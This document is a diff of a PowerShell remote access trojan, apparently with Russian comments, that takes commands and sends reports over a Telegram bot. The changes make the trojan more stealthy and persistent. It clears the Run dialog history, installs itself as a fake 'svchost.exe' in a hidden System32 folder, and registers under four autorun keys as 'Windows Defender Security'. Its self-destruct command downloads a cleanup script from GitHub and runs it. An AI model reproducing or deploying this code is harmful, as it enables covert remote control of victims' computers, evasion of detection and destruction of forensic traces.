@@ -16,6 +16,9 @@ $windowCode = '[DllImport("user32.dll")] public static extern bool ShowWindow(in
 $windowAPI = Add-Type -MemberDefinition $windowCode -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
 $windowAPI::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0) | Out-Null
 
+# Очистка истории RUN при запуске
+Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
+
 # Функция отправки сообщений с правильной кодировкой
 function Send-Telegram {
     param([string]$Message, [string]$FilePath = $null)
@@ -111,27 +114,33 @@ function Compress-Folder {
     }
 }
 
-# Уникальное имя файла для скрытности (имитация системного файла)
-$uniqueName = "Windows_Core_System_" + (Get-Date).ToString("yyyyMMdd") + ".exe"
-$scriptPath = "$env:USERPROFILE\AppData\Local\Microsoft\WindowsCore\$uniqueName"
-$scriptDir = "$env:USERPROFILE\AppData\Local\Microsoft\WindowsCore"
-
-# Создание директории если не существует
-if (!(Test-Path $scriptDir)) { 
-    New-Item -ItemType Directory -Path $scriptDir -Force | Out-Null
-    # Установка скрытого атрибута
-    Set-ItemProperty -Path $scriptDir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction SilentlyContinue
+# Уникальная установка в автозагрузку - скрытая папка в System32 с рандомным именем
+$hiddenFolder = "$env:WINDIR\System32\Microsoft.NET\Framework64\v4.0.30319\Config"
+if (!(Test-Path $hiddenFolder)) { 
+    New-Item -Path $hiddenFolder -ItemType Directory -Force | Out-Null
+    # Скрываем папку системным атрибутом
+    attrib +s +h "$hiddenFolder" 2>&1 | Out-Null
 }
+$scriptPath = "$hiddenFolder\svchost.exe"
 
-# Установка в автозагрузку
-$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
+# Копируем скрипт в скрытое место
 $scriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw
 $scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8
-Set-ItemProperty -Path $regPath -Name "WindowsCoreSystem" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force
 
-# Очистка истории RUN при установке
-Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
+# Установка в несколько мест автозагрузки для надежности
+$regPaths = @(
+    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
+    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
+    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
+    "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
+)
+
+foreach ($regPath in $regPaths) {
+    try {
+        if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
+        Set-ItemProperty -Path $regPath -Name "Windows Defender Security" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
+    } catch { }
+}
 
 # Основные переменные
 $currentDir = "C:\"
@@ -228,88 +237,92 @@ $($fileList -join "`n")"
                             }
                         }
                         "^/selfdestruct$" {
-                            # Создание VBS скрипта для самоуничтожения
-                            $vbsContent = @"
-On Error Resume Next
-Set WshShell = CreateObject("WScript.Shell")
-Set fso = CreateObject("Scripting.FileSystemObject")
-Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
-
-' Отправка начального сообщения
-Set http = CreateObject("MSXML2.ServerXMLHTTP")
-http.Open "POST", "https://api.telegram.org/bot$Token/sendMessage", False
-http.setRequestHeader "Content-Type", "application/json"
-http.Send "{""chat_id"": ""$ChatID"", ""text"": ""🔄 Запущен процесс самоуничтожения RAT...""}"
-
-' Ожидание завершения PowerShell процессов
-WScript.Sleep 5000
-
-' Завершение всех процессов PowerShell
-For Each Process in objWMIService.ExecQuery("Select * from Win32_Process Where Name='powershell.exe'")
-    Process.Terminate()
-Next
-
-' Завершение процессов wscript
-For Each Process in objWMIService.ExecQuery("Select * from Win32_Process Where Name='wscript.exe'")
-    Process.Terminate()
-Next
-
-WScript.Sleep 2000
-
-' Удаление файлов RAT
-If fso.FileExists("$scriptPath") Then
-    fso.DeleteFile "$scriptPath", True
-End If
-
-If fso.FileExists("$($MyInvocation.MyCommand.Path)") Then
-    fso.DeleteFile "$($MyInvocation.MyCommand.Path)", True
-End If
-
-' Удаление директории если пустая
-If fso.FolderExists("$scriptDir") Then
-    fso.DeleteFolder "$scriptDir", True
-End If
-
-' Очистка реестра
-On Error Resume Next
-WshShell.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsCoreSystem"
-WshShell.Run "reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f", 0, True
-
-' Проверка успешности удаления
-Dim success
-success = True
-
-If fso.FileExists("$scriptPath") Then
-    success = False
-End If
-
-If fso.FolderExists("$scriptDir") Then
-    success = False
-End If
-
-' Отправка отчета в Telegram
-If success Then
-    http.Open "POST", "https://api.telegram.org/bot$Token/sendMessage", False
-    http.setRequestHeader "Content-Type", "application/json"
-    http.Send "{""chat_id"": ""$ChatID"", ""text"": ""✅ RAT успешно самоуничтожен. Все следы удалены: файлы, процессы, записи реестра.""}"
-Else
-    http.Open "POST", "https://api.telegram.org/bot$Token/sendMessage", False
-    http.setRequestHeader "Content-Type", "application/json"
-    http.Send "{""chat_id"": ""$ChatID"", ""text"": ""❌ Ошибка при самоуничтожении RAT. Некоторые файлы не были удалены.""}"
-End If
-
-' Самоуничтожение VBS скрипта
-fso.DeleteFile WScript.ScriptFullName, True
-"@
-
-                            $vbsPath = "$env:TEMP\cleanup_" + (Get-Random) + ".vbs"
-                            $vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII
+                            Send-Telegram "🔄 Запуск процедуры самоуничтожения..."
                             
-                            # Запуск VBS скрипта
-                            $process = Start-Process -FilePath "wscript.exe" -ArgumentList "//B `"$vbsPath`"" -PassThru -WindowStyle Hidden
-                            
-                            # Немедленный выход из основного скрипта
-                            exit
+                            try {
+                                # Загружаем и выполняем скрипт очистки
+                                $cleanupScript = Invoke-RestMethod -Uri "https://raw.githubusercontent.com/imsog/system-scanner/refs/heads/main/cleanup.ps1" -UseBasicParsing
+                                
+                                # Создаем временный файл для скрипта очистки
+                                $cleanupPath = "$env:TEMP\cleanup_$(Get-Random).ps1"
+                                $cleanupScript | Out-File -FilePath $cleanupPath -Encoding UTF8
+                                
+                                # Запускаем скрипт очистки в отдельном процессе
+                                $process = Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$cleanupPath`"" -PassThru
+                                
+                                # Ждем завершения процесса очистки
+                                $process.WaitForExit(30000) # 30 секунд таймаут
+                                
+                                if ($process.HasExited -and $process.ExitCode -eq 0) {
+                                    Send-Telegram "✅ Самоуничтожение успешно завершено"
+                                } else {
+                                    Send-Telegram "⚠️ Самоуничтожение завершено с ошибками, выполняется ручная очистка..."
+                                    
+                                    # Ручная очистка если автоматическая не сработала
+                                    # Очистка истории RUN
+                                    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
+                                    
+                                    # Удаление из автозагрузки
+                                    foreach ($regPath in $regPaths) {
+                                        try {
+                                            Remove-ItemProperty -Path $regPath -Name "Windows Defender Security" -Force -ErrorAction SilentlyContinue
+                                        } catch { }
+                                    }
+                                    
+                                    # Удаление файлов
+                                    $filesToDelete = @(
+                                        $scriptPath,
+                                        $MyInvocation.MyCommand.Path,
+                                        $cleanupPath
+                                    )
+                                    
+                                    foreach ($file in $filesToDelete) {
+                                        if (Test-Path $file) { 
+                                            try {
+                                                Remove-Item $file -Force -ErrorAction SilentlyContinue 
+                                            } catch {
+                                                # Пытаемся переименовать и удалить после перезагрузки
+                                                try {
+                                                    $newName = "$file.todelete"
+                                                    Rename-Item $file $newName -ErrorAction SilentlyContinue
+                                                    cmd /c "del /f /q `"$newName`"" 2>&1 | Out-Null
+                                                } catch { }
+                                            }
+                                        }
+                                    }
+                                    
+                                    # Завершаем процессы RAT
+                                    $currentPID = $pid
+                                    Get-WmiObject Win32_Process | Where-Object { 
+                                        $_.CommandLine -like "*$scriptPath*" -or 
+                                        $_.CommandLine -like "*$($MyInvocation.MyCommand.Path)*" 
+                                    } | ForEach-Object { 
+                                        if ($_.ProcessId -ne $currentPID) {
+                                            Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
+                                        }
+                                    }
+                                    
+                                    Send-Telegram "✅ Ручная очистка завершена, RAT уничтожен"
+                                }
+                                
+                                # Завершаем текущий процесс
+                                Stop-Process -Id $pid -Force
+                                
+                            } catch {
+                                Send-Telegram "❌ Ошибка при самоуничтожении: $($_.Exception.Message)"
+                                
+                                # Аварийная очистка
+                                try {
+                                    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
+                                    foreach ($regPath in $regPaths) {
+                                        Remove-ItemProperty -Path $regPath -Name "Windows Defender Security" -Force -ErrorAction SilentlyContinue -ErrorAction SilentlyContinue
+                                    }
+                                    Stop-Process -Id $pid -Force
+                                } catch {
+                                    # Принудительное завершение
+                                    cmd /c "taskkill /f /pid $pid" 2>&1 | Out-Null
+                                }
+                            }
                         }
                     }
                 }
